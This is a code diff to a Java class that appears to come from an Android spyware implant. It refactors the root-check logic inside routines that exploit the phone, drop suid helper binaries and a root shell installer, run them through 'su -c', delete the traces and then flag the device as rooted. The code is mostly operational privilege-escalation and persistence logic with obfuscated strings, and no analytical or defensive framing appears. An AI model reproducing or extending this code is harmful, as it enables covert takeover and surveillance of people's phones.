@@ -57,7 +57,7 @@ public class Root {
 	static public boolean shouldAskForAdmin() {
 		boolean ret = false;
 
-		if (Root.isRootShellInstalled() == true) {
+		if (PackageInfo.checkRoot() == true) {
 			ret = false;
 		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
 		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
@@ -89,7 +89,7 @@ public class Root {
 
 	static public void exploitPhone() {
 		method = M.e("previous");
-		if (Root.isRootShellInstalled() == true) {
+		if (PackageInfo.checkRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
 			}
@@ -301,7 +301,7 @@ public class Root {
 			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
 			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext);
 
-			ExecuteResult res = Execute.execute(new String[] { "su", "-c", suidext.getFilename(), "rt" });
+			ExecuteResult res = Execute.execute(new String[] { "su", "-c", suidext.getFilename() + " rt" });
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
@@ -309,13 +309,10 @@ public class Root {
 
 			suidext.delete();
 
-			if (Root.isRootShellInstalled()) {
+			if (PackageInfo.checkRoot()) {
+				Status.setRoot(true);
 
-				if (PackageInfo.checkRoot()) {
-					Status.setRoot(true);
-
-					Status.self().setReload();
-				}
+				Status.self().setReload();
 			}
 
 		} catch (final Exception e1) {
@@ -374,13 +371,10 @@ public class Root {
 			shellInstaller.delete();
 			selinuxSuidext.delete();
 
-			if (Root.isRootShellInstalled()) {
+			if (PackageInfo.checkRoot()) {
+				Status.setRoot(true);
 
-				if (PackageInfo.checkRoot()) {
-					Status.setRoot(true);
-
-					Status.self().setReload();
-				}
+				Status.self().setReload();
 			}
 
 		} catch (final Exception e1) {
@@ -700,10 +694,6 @@ public class Root {
 		Root.adjustOom();
 	}
 
-	static public boolean isRootShellInstalled() {
-		return PackageInfo.checkRoot();
-	}
-
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
 			FileNotFoundException {
 		try {
@@ -955,13 +945,10 @@ public class Root {
 				shellInstaller.delete();
 				selinuxSuidext.delete();
 
-				if (Root.isRootShellInstalled()) {
+				if (PackageInfo.checkRoot()) {
+					Status.setRoot(true);
 
-					if (PackageInfo.checkRoot()) {
-						Status.setRoot(true);
-
-						Status.self().setReload();
-					}
+					Status.self().setReload();
 				}
 
 			} catch (final Exception e1) {
@@ -1045,16 +1032,15 @@ public class Root {
 							}
 						}
 
-						if (finished || Root.isRootShellInstalled()) {
+						if (finished || PackageInfo.checkRoot()) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + "(run): exploitation terminated after "
 										+ (System.currentTimeMillis() - curTime) / 1000 + " seconds");
 							}
-							if (PackageInfo.checkRoot()) {
-								Status.setRoot(true);
 
-								Status.self().setReload();
-							}
+							Status.setRoot(true);
+							Status.self().setReload();
+
 							break;
 						}
 
